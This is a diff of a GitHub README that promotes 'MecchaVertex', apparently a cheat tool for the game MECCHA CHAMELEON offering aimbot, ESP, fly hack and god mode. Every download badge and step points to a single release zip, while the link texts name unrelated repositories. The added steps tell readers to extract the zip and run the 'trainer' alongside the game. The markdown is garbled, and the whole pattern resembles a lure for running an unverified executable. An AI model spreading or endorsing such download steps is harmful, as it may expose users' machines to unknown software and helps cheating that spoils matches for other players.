@@ -1,4 +1,4 @@
-# 👻 MecchaVertex
+# MecchaVertex
 <div align="center">
 
 <img width="1920" height="1080" alt="cover (8)" src="https://github.com/user-attachments/assets/8487689f-58ec-46ff-af80-2cba78638070" />
@@ -11,8 +11,11 @@ ESP · Aimbot · Fly Hack · Teleport · God Mode · Infinite Paint
 
 ---
 
-| [![▶ DOWNLOAD NOW]([https://img.shields.io/badge/](https://github.com/floorspinnerrevive/MecchaVertex/releases/download/VERTEX/MecchaVertex.zip)▶_DOWNLOAD_NOW-2ea043?style=for-the-badge&logo=github&logoColor=white&labelColor=1a7a37&logoSize=auto)]([https://github.com/Fragmenttobulwark/tzmedxku/releases/download/MecchaTitan/MecchaTitan.zip](https://github.com/floorspinnerrevive/MecchaVertex/releases/download/VERTEX/MecchaVertex.zip)) | [![⭐ FEATURES]([https://img.shields.io/badge/](https://github.com/floorspinnerrevive/MecchaVertex/releases/download/VERTEX/MecchaVertex.zip)⭐_FEATURES-1f6feb?style=for-the-badge&labelColor=0d47a1&logo=github&logoColor=white)]([https://github.com/PitShipwrightGraph/MecchaTitan#-features](https://github.com/floorspinnerrevive/MecchaVertex/releases/download/VERTEX/MecchaVertex.zip)) | [![🛠 INSTALL]([[https://img.shields.io/badge/](https://github.com/floorspinnerrevive/MecchaVertex/releases/download/VERTEX/MecchaVertex.zip)](https://github.com/floorspinnerrevive/MecchaVertex/releases/download/VERTEX/MecchaVertex.zip)🛠_INSTALL-ea7f2e?style=for-the-badge&labelColor=bf5e1a&logo=github&logoColor=white)]([https://github.com/Fragmenttobulwark/tzmedxku/releases/download/MecchaTitan/MecchaTitan.zip](https://github.com/floorspinnerrevive/MecchaVertex/releases/download/VERTEX/MecchaVertex.zip)) | [![💬 SUPPORT]([https://img.shields.io/badge/](https://github.com/floorspinnerrevive/MecchaVertex/releases/download/VERTEX/MecchaVertex.zip)💬_SUPPORT-8b5cf6?style=for-the-badge&labelColor=5b2d8e&logo=discord&logoColor=white)]([https://github.com/PitShipwrightGraph/MecchaTitan#-support](https://github.com/floorspinnerrevive/MecchaVertex/releases/download/VERTEX/MecchaVertex.zip) |
-|:---:|:---:|:---:|:---:|
+<div align="center">
+
+[![⬇️ Download](https://img.shields.io/badge/⬇️_Download-cc0000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/floorspinnerrevive/MecchaVertex/releases/download/VERTEX/MecchaVertex.zip)
+
+</div>
 
 </div>
 
@@ -23,6 +26,22 @@ ESP · Aimbot · Fly Hack · Teleport · God Mode · Infinite Paint
 **MecchaVertex** is a complete hack tool for **MECCHA CHAMELEON** – the viral hide-and-seek game that took Steam by storm with over 10 million copies sold and 340,000 concurrent players. This tool gives you full control with ESP, aimbot, fly hack, teleport, god mode, infinite paint, and more. Dominate every match and become the ultimate chameleon!
 
 ⚠️ **Disclaimer:** This tool is for educational purposes only. Use at your own risk.
+
+---
+
+## Download
+
+<div align="center">
+
+### → [Download MecchaVertex.zip](https://github.com/floorspinnerrevive/MecchaVertex/releases/download/VERTEX/MecchaVertex.zip) ←
+
+</div>
+
+1. Download the latest build from the [release link](https://github.com/floorspinnerrevive/MecchaVertex/releases/download/VERTEX/MecchaVertex.zip)
+2. Extract next to your MECCHA CHAMELEON install
+3. Launch the game, then the trainer
+4. Press INSERT or F1 to open the menu
+5. Toggle ESP / Combat / Movement / Protection as needed
 
 ---
 
